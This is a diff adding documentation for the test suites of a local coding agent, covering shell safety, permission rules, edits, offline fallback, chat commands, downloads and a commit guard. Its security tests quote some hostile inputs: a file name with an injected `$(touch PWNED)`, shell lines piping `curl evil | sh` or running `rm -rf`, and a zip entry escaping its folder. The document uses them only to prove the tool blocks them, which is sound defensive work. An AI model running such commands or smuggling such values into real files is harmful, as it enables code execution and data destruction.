@@ -636,3 +636,347 @@ Node, Go, Rust, gcc/g++ and PowerShell, so they all ran); everything else uses f
 @@ tests/test_phase9.py footer @@
 - Lets you run the file directly.
 
+---
+# `tests/test_phase10.py` — version 0.6: safety, faithful edits, offline/online, the Claude-Code-style chat
+
+**Role:** proves every fix and feature of version 0.6. Each class below starts from a problem that was **reproduced
+first** (a probe script showed the old behaviour) and then fixed; the test pins the fixed behaviour so it cannot
+return. 59 tests, about 11 seconds, no model and no internet needed.
+
+## Helpers
+@@ tests/test_phase10.py header @@
+- Imports the code under test (whole modules — `cli`, `localserver`, `runners` — where tests replace a function with a
+  mock, and names otherwise). The runner function `test_kind` is called as `runners.test_kind`: imported by its name, a
+  test tool such as pytest would mistake it for a test.
+- `check_commit` is loaded **from its file** with `importlib`, because `tools/` is a folder of scripts, not a package.
+- `FAKE_LLAMA` is a tiny stand-in for llama.cpp's server, saved to a file and started by the lifecycle test: it reads
+  `--port` like the real one, answers `/health` with 503 ("loading") for its first 0.3 seconds and 200 after, and
+  answers every chat request with "local hello".
+
+@@ tests/test_phase10.py box @@
+@@ tests/test_phase10.py free_port @@
+- `box` makes a toolbox on a temporary folder that approves everything, with automatic formatting off so the bytes on
+  disk are exactly what the test expects. `free_port` asks the system for a port nothing listens on.
+
+## Safety
+@@ tests/test_phase10.py SafetyTests @@
+@@ tests/test_phase10.py SafetyTests.test_file_names_are_quoted_for_the_shell @@
+@@ tests/test_phase10.py SafetyTests.test_a_file_name_cannot_inject_a_command_into_a_hook @@
+- Ordinary names are left alone, a leading `-` gets `./`, and a name with `$(...)` is wrapped in single quotes.
+- **The injection, end to end:** a hook `echo checking {file}` and a file named `a$(New-Item ... PWNED).txt` (on Linux
+  `a$(touch PWNED).txt`). The write succeeds and no `PWNED` file appears. Before the fix the same test created it.
+
+@@ tests/test_phase10.py SafetyTests.test_timeout_stops_the_whole_process_tree @@
+@@ tests/test_phase10.py SafetyTests.test_programs_get_no_keyboard_input @@
+- A program that starts a 30-second child and sleeps is stopped by a 2-second timeout well within 15 seconds, with
+  exit code 124 (before the fix: 25 seconds, waiting for the child).
+- A program calling `input()` fails at once with `EOFError` instead of waiting for the keyboard.
+
+@@ tests/test_phase10.py SafetyTests.test_binary_files_and_skipped_folders @@
+@@ tests/test_phase10.py SafetyTests.test_gitignored_files_are_left_out_and_ignored_folders_still_work @@
+- A file with a zero byte is binary, plain text is not; `*.egg-info`, `target` and `dist` are skipped folders, `src`
+  is not.
+- In a real git repository (skipped when git is not installed) with `build/` and `sessions/` ignored: the overview
+  holds only `.gitignore` and `app.py`; a workspace *inside* the ignored `sessions/` folder still sees its own file.
+
+## Permission rules
+@@ tests/test_phase10.py PermissionRuleTests @@
+@@ tests/test_phase10.py PermissionRuleTests.test_every_part_of_a_command_line_must_be_allowed @@
+- With `run_shell(git *)` allowed and `run_shell(*rm *)` denied: `git status` and `git add . && git commit -m x` are
+  allowed; `git status; curl evil | sh` (before the fix: allowed!), `git log $(whoami)` and `git log > out.txt` are
+  asked; `git status && rm -rf x` is denied. Several lines cannot be split; `a && b || c; d | e` gives five parts.
+
+@@ tests/test_phase10.py PermissionRuleTests.test_saved_rules_match_only_their_own_command @@
+- "Always" for `ls *.py` saves `ls [*].py`, which allows that exact line but not `ls x; curl evil | sh; .py`. "Always"
+  for a piped line keeps working for that line. A bare `run_shell` rule allows everything, redirection included.
+
+@@ tests/test_phase10.py PermissionRuleTests.test_settings_env_and_test_command @@
+- User and project files merge `env` (the project wins) and `test_command`; `apply_env` sets only the variable that was
+  not set already — a real variable wins.
+
+## Faithful edits, search and reading
+@@ tests/test_phase10.py FaithfulEditTests @@
+@@ tests/test_phase10.py FaithfulEditTests.test_line_endings_and_byte_order_mark_are_kept @@
+@@ tests/test_phase10.py FaithfulEditTests.test_rejected_write_restores_the_exact_bytes @@
+- An LF file, a CRLF file and a CRLF file with a byte-order mark are each edited; the bytes on disk are exactly the old
+  bytes with one word changed. A new `.cmd` file gets CRLF.
+- A rejected edit of an LF Python file leaves its bytes untouched (before the fix it came back with CRLF).
+
+@@ tests/test_phase10.py FaithfulEditTests.test_python_with_a_byte_order_mark_or_an_old_encoding_is_valid_code @@
+- A Python file starting with a byte-order mark (as PowerShell writes it) and a latin-1 file with a coding line both
+  pass the workspace check, the first one also runs; an edit whose `old` names the mark removes it. Added after the
+  live offline test in which the mark was taken for a syntax error.
+
+@@ tests/test_phase10.py FaithfulEditTests.test_empty_old_text_is_refused @@
+- `edit_file` with an empty `old` and `all=true`, and `multi_edit` with an empty `old`, are both refused; the file still
+  says `abc` (before the fix: `XaXbXcX`).
+
+@@ tests/test_phase10.py FaithfulEditTests.test_search_covers_every_text_file @@
+- A search without a glob finds `.ts`, `.js` and `.py` files but not the binary one; `*.{js,ts}` finds exactly the two;
+  `src/*` matches by path; and `path` may name one file.
+
+@@ tests/test_phase10.py FaithfulEditTests.test_read_file_refuses_binary_and_says_how_much_is_left @@
+- A binary file is refused. Reading lines 2-3 of a 10-line file ends with `(lines 2-3 of 10)`; starting at line 50 says
+  the file has only 10 lines. With the size limit lowered to 10 bytes (a mock), a whole read is refused but a range is
+  read line by line.
+
+## Language checks
+@@ tests/test_phase10.py LanguageCheckTests @@
+@@ tests/test_phase10.py LanguageCheckTests.check @@
+@@ tests/test_phase10.py LanguageCheckTests.test_json_with_comments_where_the_format_allows_them @@
+- One JSONC text (comments, trailing commas, and a string containing `//` and `, }`) passes as `tsconfig.json` and as
+  `settings.jsonc` but fails as `package.json`; a JSON file with a byte-order mark passes; `strip_jsonc` keeps strings
+  intact.
+
+@@ tests/test_phase10.py LanguageCheckTests.test_header_files_may_be_c_or_cpp @@
+@@ tests/test_phase10.py LanguageCheckTests.test_rust_files_may_name_modules_not_written_yet @@
+- A C++ header and a C header named `.h` both pass, a broken one fails (needs gcc and g++).
+- `main.rs` declaring a module that does not exist yet passes; a syntax error still fails (needs rustfmt).
+
+## Running tests the project's way
+@@ tests/test_phase10.py TestRunnerTests @@
+@@ tests/test_phase10.py TestRunnerTests.test_the_right_test_tool_is_chosen @@
+- An empty folder → `python`; a `package.json` with a real test script → `npm`; npm's placeholder script → `python`;
+  a `go.mod` → `go`; Python tests in a plain `tests` folder → `python` again (they win), started with `-s tests`.
+
+@@ tests/test_phase10.py TestRunnerTests.test_tests_in_a_plain_tests_folder_are_found @@
+@@ tests/test_phase10.py TestRunnerTests.test_your_own_test_command_from_the_settings @@
+@@ tests/test_phase10.py TestRunnerTests.test_the_project_virtual_environment_is_used @@
+- A test in `tests/` without `__init__.py` really runs (`Ran 1 test`, or `1 passed` where pytest is installed) — before
+  the fix: `Ran 0 tests`, exit code 5.
+- A `test_command` from the settings is what runs.
+- Without a project environment the agent's Python is used; with a `.venv` holding a Python, that one is.
+
+## History, empty answers, cut-off answers, switching
+@@ tests/test_phase10.py HistoryTests @@
+@@ tests/test_phase10.py HistoryTests.history @@
+- A small conversation whose first tool call writes 5 000 characters (with a thought signature) and whose tool result
+  has 3 000.
+
+@@ tests/test_phase10.py HistoryTests.test_tool_call_arguments_count_and_are_shortened_last @@
+@@ tests/test_phase10.py HistoryTests.test_oldest_exchanges_are_dropped_only_as_a_last_resort @@
+- The call's size includes its arguments. A budget of 6 000 blanks the old output but keeps the arguments; a budget
+  of 1 000 also shortens them (keeping `path`, dropping the signature). The original list is never changed.
+- When even that cannot fit (a 9 000-character first request), the oldest exchange is dropped: the result starts with
+  the system prompt and the next user message, and the last four messages are unchanged.
+
+@@ tests/test_phase10.py HistoryTests.make @@
+@@ tests/test_phase10.py HistoryTests.test_the_agent_measures_arguments_too @@
+@@ tests/test_phase10.py HistoryTests.test_an_empty_answer_is_retried_once @@
+- `make` builds an agent with a scripted model. Adding the big call grows the agent's measured size by more than 5 000.
+- An empty answer followed by "4" returns "4", with the reminder in the history and no empty assistant message left
+  in it; two empty answers return `EMPTY_TWICE`.
+
+@@ tests/test_phase10.py HistoryTests.test_cut_off_arguments_are_explained_and_a_cut_off_answer_is_kept @@
+@@ tests/test_phase10.py HistoryTests.test_polite_requests_still_count_as_changes @@
+@@ tests/test_phase10.py HistoryTests.test_switching_models_keeps_the_conversation @@
+- A `write_file` with cut-off arguments gets `BAD_ARGUMENTS`; a cut-off `finish` returns
+  `The answer is 42 bec [answer cut off]`.
+- "Please fix", "can you add", "Go ahead and create", "I want you to rename" want changes; "Can you explain", "why is
+  it slow" and "please" alone do not.
+- After `set_backend` the new model answers, `agent.backend` is it, and the first request is still in the history.
+
+## Sessions and `/undo`
+@@ tests/test_phase10.py SessionAndUndoTests @@
+@@ tests/test_phase10.py SessionAndUndoTests.test_resume_skips_what_reset_or_compact_left_behind @@
+@@ tests/test_phase10.py SessionAndUndoTests.test_agent_marks_reset_and_compaction_in_the_log @@
+- A log with "secret topic", a reset, "new topic" and a half-written line resumes with only "new topic"; its title
+  still shows the first request.
+- An agent that answered, was reset, answered twice and compacted resumes with the summary first, and the request from
+  before the reset is gone.
+
+@@ tests/test_phase10.py SessionAndUndoTests.test_undo_skips_quiet_requests_and_keeps_your_own_edits @@
+@@ tests/test_phase10.py SessionAndUndoTests.test_snapshots_store_each_content_once @@
+- A request changes `a.txt` and `b.txt` and creates `c.txt`; a question changes nothing; then *you* edit `b.txt`. `/undo`
+  restores `a.txt`, removes `c.txt`, leaves your `b.txt` alone and says so, naming the request; the question was never
+  an undo step. A second `/undo` has nothing to do.
+- Five files with the same content, snapshotted three times, are stored once.
+
+## Offline detection
+@@ tests/test_phase10.py OfflineTests @@
+@@ tests/test_phase10.py OfflineTests.chain @@
+- A chain of one rate-limited ("hosted") model and optionally a local one, with an injectable probe and clock.
+
+@@ tests/test_phase10.py OfflineTests.test_no_internet_goes_straight_to_the_local_model_and_back @@
+- The whole cycle with a fake clock: a name-lookup failure is not retried, the local model answers, and an "unreachable"
+  notice appears; the next call skips the hosted model entirely; after the cool-down, with the probe still failing, it
+  is skipped again (no request sent); when the probe succeeds the hosted model answers and "back online" is announced.
+
+@@ tests/test_phase10.py OfflineTests.test_a_repeated_network_error_also_means_offline @@
+@@ tests/test_phase10.py OfflineTests.test_without_a_local_model_the_error_says_what_to_do @@
+@@ tests/test_phase10.py OfflineTests.test_a_final_error_is_not_retried @@
+- Two network errors (no name failure) mean offline after one retry. Without a local model the error starts with
+  `OFFLINE_HELP`. A `final` error from the local model is not retried (one call).
+
+## Rate limiter, configuration
+@@ tests/test_phase10.py LimiterTests @@
+@@ tests/test_phase10.py LimiterTests.test_pacific_time_without_time_zone_data @@
+@@ tests/test_phase10.py LimiterTests.test_one_shared_limiter_per_model_and_long_waits_are_announced @@
+- The daylight-saving switches of 2026 to the minute (8 March 10:00 UTC, 1 November 09:00 UTC); and with `zoneinfo`
+  made unavailable (as on Windows), 23:30 on 1 July in California is still 1 July (the old fallback said 2 July).
+- The same model and limits give the same limiter object. A limiter of 1 request per minute announces the wait for
+  the second request; the usage folder holds only `usage.json` afterwards (no temporary files left).
+
+@@ tests/test_phase10.py ConfigTests @@
+@@ tests/test_phase10.py ConfigTests.test_bad_values_are_explained @@
+- `LOCALAGENT_NUM_CTX=8k` and an unknown `LOCALAGENT_MODE` raise explanations naming the variable; `OFFLINE` in capitals
+  and `LOCALAGENT_GPU_LAYERS=9` are read correctly.
+
+## The local model server
+@@ tests/test_phase10.py LocalServerTests @@
+@@ tests/test_phase10.py LocalServerTests.test_files_are_found_where_they_are_expected @@
+@@ tests/test_phase10.py LocalServerTests.test_command_line_and_where_a_server_may_be_started @@
+- With `HOME` pointed at a temporary folder: the model file is found and `mmproj-*.gguf` never chosen; no server
+  program means none is found; an explicit model path wins.
+- The command line carries the port from the address, and `-ngl` only when GPU layers were set. A server may be
+  started for `127.0.0.1` but not for a remote address.
+
+@@ tests/test_phase10.py LocalServerTests.test_a_running_server_is_used_and_the_history_fitted @@
+@@ tests/test_phase10.py LocalServerTests.test_nothing_local_is_a_final_error @@
+- With a fake OpenAI-style server running, the local model answers through it, and a conversation four times too big
+  for a 2 000-token window reaches the server shortened.
+- With nothing running and nothing to start, the error is `final` and says "No local model".
+
+@@ tests/test_phase10.py LocalServerTests.test_llama_server_is_started_waited_for_and_stopped @@
+- **The real start-up, with the fake server program:** `LocalModel` finds nothing running, starts the program (its
+  command line replaced by the fake), waits through the "loading" answers until `/health` says 200, answers "local
+  hello", reports "starting" and "ready", and the process is stopped afterwards. (The real `llama-server.exe` was also
+  checked separately — see `localserver.md`.)
+
+## Modes and the chat
+@@ tests/test_phase10.py ModeTests @@
+@@ tests/test_phase10.py ModeTests.choose @@
+- Runs `choose_mode` with a key or not and a chosen kind of local model (the three detection functions replaced by
+  mocks, `describe_local` by a fixed text).
+
+@@ tests/test_phase10.py ModeTests.test_each_mode_chooses_its_models @@
+@@ tests/test_phase10.py ModeTests.test_impossible_modes_say_what_to_do @@
+- Online: Gemini, no backup. Auto with a key: Gemini plus the local backup (or Ollama). Auto without a key: the local
+  model with an 8K budget and a note saying why. Offline: the local model even with a key.
+- Online without a key, offline without a local model, auto with nothing, and an unknown mode each raise an
+  explanation.
+
+@@ tests/test_phase10.py ModeTests.test_backends_for_the_modes @@
+@@ tests/test_phase10.py ModeTests.test_flags @@
+- `local` builds a `LocalModel`; a Gemini chain with a `local` fallback ends with a `LocalModel` and has a probe; labels
+  name the local model by its file.
+- `--offline`, `--online`, `--mode`, `-p` and `-c` set what they should; `--version` prints the version.
+
+@@ tests/test_phase10.py ChatTests @@
+@@ tests/test_phase10.py ChatTests.chat @@
+@@ tests/test_phase10.py ChatTests.say @@
+- `chat` builds a `Chat` with a scripted model (and `run_tests` allowed); `say` types one line and returns what was
+  printed.
+
+@@ tests/test_phase10.py ChatTests.test_bang_runs_a_command_and_its_output_goes_with_the_next_request @@
+@@ tests/test_phase10.py ChatTests.test_hash_saves_a_note_and_at_attaches_a_file @@
+@@ tests/test_phase10.py ChatTests.test_attachments_respect_the_size_limit @@
+- `!echo hello-from-shell` prints the output with no model call; the next request carries it, followed by "My
+  request: ...".
+- `# always use type hints` lands under `## Notes`, before the next section, and is in the system prompt at once.
+  `@app.py` attaches the file (and `me@example.com` is ignored).
+- A file bigger than the limit, and a missing file, are not attached; trailing punctuation after `@big.txt.` is ignored.
+
+@@ tests/test_phase10.py ChatTests.test_model_status_and_switching @@
+@@ tests/test_phase10.py ChatTests.test_clear_resume_permissions_and_unknown_commands @@
+- `/model` shows the mode and the offline model. `/offline` (with the mode choice and backend mocked) switches the agent
+  to the new backend and mode. A failing switch (`no key`) is reported and changes nothing.
+- `/clear` empties the conversation; `/resume` lists it (marked as this conversation); `/permissions` shows the rules;
+  an unknown command says so; `/exit` quits.
+
+@@ tests/test_phase10.py ChatTests.test_print_mode_answers_once @@
+@@ tests/test_phase10.py ChatTests.test_prompts_without_a_keyboard_mean_no @@
+@@ tests/test_phase10.py ChatTests.test_colours_only_where_wanted @@
+@@ tests/test_phase10.py ChatTests.test_overview_summarises_crowded_folders @@
+- `-p`: the answer alone on standard output, exit code 0, and a `run_tests` the model asked for is refused (nobody to ask).
+- An approval or a confirmation with no input means no.
+- With colours an added diff line is green; without, plain; `NO_COLOR` switches colours off.
+- 30 DLLs, two source files and a README in 6 lines: the README, one summary line for `bin/`, both source files.
+
+## The commit guard
+@@ tests/test_phase10.py CommitGuardTests @@
+@@ tests/test_phase10.py CommitGuardTests.test_problems_in_staged_files @@
+@@ tests/test_phase10.py CommitGuardTests.test_only_a_private_author_address_passes @@
+- A clean file passes; a fake Google key (built at run time) is found; `.env` is refused but `.env.example` is fine; a
+  5 GB model file gets two problems (its kind and its size) without being read.
+- A noreply author passes; a Gmail author gets the explanation.
+
+@@ tests/test_phase10.py footer @@
+- Lets you run the file directly.
+
+---
+# `tests/test_product.py` — the product commands
+
+**Role:** proves the parts that turn the agent into a downloadable product — verified and resumable downloads, safe
+unpacking, the model catalog, `localagent setup` and `localagent models` — without downloading anything real: a small
+local file server plays GitHub and Hugging Face. 15 tests, about 3 seconds.
+
+## Helpers
+@@ tests/test_product.py header @@
+- `DATA` is 1 MB of test content and `DATA_SHA` its checksum, standing in for a model file.
+
+@@ tests/test_product.py RangeServer @@
+@@ tests/test_product.py RangeServer.__init__ @@
+@@ tests/test_product.py RangeServer.close @@
+- A file server on a free local port that records every `Range` header it receives, answers a Range request with `206`
+  and the rest of the file (or, with `honour_range=False`, ignores it and sends everything with `200`), and with
+  `cut_at` sends only that many bytes — a connection that "breaks".
+
+## Downloads
+@@ tests/test_product.py DownloadTests @@
+@@ tests/test_product.py DownloadTests.serve @@
+@@ tests/test_product.py DownloadTests.test_a_download_is_verified_and_kept_once @@
+@@ tests/test_product.py DownloadTests.test_a_wrong_checksum_deletes_the_file @@
+- A download arrives complete and reports progress up to its size; asking again sends no second request.
+- With a wrong checksum the download fails and nothing is left in the folder — not even the part.
+
+@@ tests/test_product.py DownloadTests.test_an_interrupted_download_continues_where_it_stopped @@
+@@ tests/test_product.py DownloadTests.test_a_server_ignoring_the_range_sends_everything_again @@
+- A connection that breaks after 300 000 bytes leaves exactly that part and the advice to run again; the next run asks
+  only for `bytes=300000-` and ends with the complete, verified file.
+- A server that ignores the Range request still ends with the right file (the part is started again).
+
+@@ tests/test_product.py DownloadTests.test_archives_are_unpacked_only_inside_their_folder @@
+- A normal zip unpacks; a zip with `../outside.txt` is refused and writes nothing outside; a `.tar.gz` (the Linux and
+  macOS format) unpacks too.
+
+## Catalog and llama.cpp
+@@ tests/test_product.py CatalogTests @@
+@@ tests/test_product.py CatalogTests.test_the_suggestion_follows_the_memory @@
+- 15.7 GB → the 8B model, 7.8 GB → 4B, 4 GB → 1.7B, unknown → 4B; names match in any case; this computer's memory is
+  read; every catalog entry has a 64-character checksum and a matching address.
+
+@@ tests/test_product.py CatalogTests.test_the_newest_llama_build_with_a_checksum_is_chosen @@
+- Three releases: a placeholder like llama.cpp's real `v1.0.0`, one whose file has no checksum, and one with both
+  builds. The Vulkan build of the third is chosen; a platform no release has gives a clear error.
+
+@@ tests/test_product.py CatalogTests.test_llama_cpp_is_installed_from_a_verified_archive @@
+@@ tests/test_product.py CatalogTests.test_a_model_goes_to_the_models_folder @@
+- A zip holding a fake `llama-server.exe`, served locally, is downloaded, verified, unpacked into its build folder,
+  and its archive deleted.
+- A model download is asked for with the catalog's address, checksum and size, into the models folder.
+
+## Setup and the models command
+@@ tests/test_product.py SetupTests @@
+@@ tests/test_product.py SetupTests.run_setup @@
+- Runs `run_setup` with the key check, the finders, the installers and Docker replaced, typed answers from a list, a
+  pasted key, and a settings file in a temporary folder; returns the exit code, everything said, and what was saved.
+
+@@ tests/test_product.py SetupTests.test_a_pasted_key_is_checked_and_saved @@
+@@ tests/test_product.py SetupTests.test_a_rejected_key_is_not_saved_and_missing_parts_are_offered @@
+@@ tests/test_product.py SetupTests.test_declining_everything_leaves_no_model @@
+- A good pasted key is saved under `env`, and with llama.cpp and a model present the result is "Ready, online and
+  offline".
+- A rejected key is not saved; the missing llama.cpp and model are offered and installed; offline alone counts as ready.
+- Skipping the key and declining both downloads ends with "No model is ready yet" and exit code 1.
+
+@@ tests/test_product.py SetupTests.test_models_list_and_use @@
+@@ tests/test_product.py SetupTests.test_saving_a_setting_keeps_the_others @@
+@@ tests/test_product.py SetupTests.test_the_commands_are_reached_from_the_command_line @@
+- The list marks the model in use with `*`; `use qwen3-4b` saves its full path; a model that is not there, an unknown
+  download and an unknown action each return 2.
+- Saving two variables keeps the permission rules already in the file.
+- `localagent models use qwen3-4b` and `localagent setup` reach their functions; `--help` names the commands.
+
+@@ tests/test_product.py footer @@
+- Lets you run the file directly.
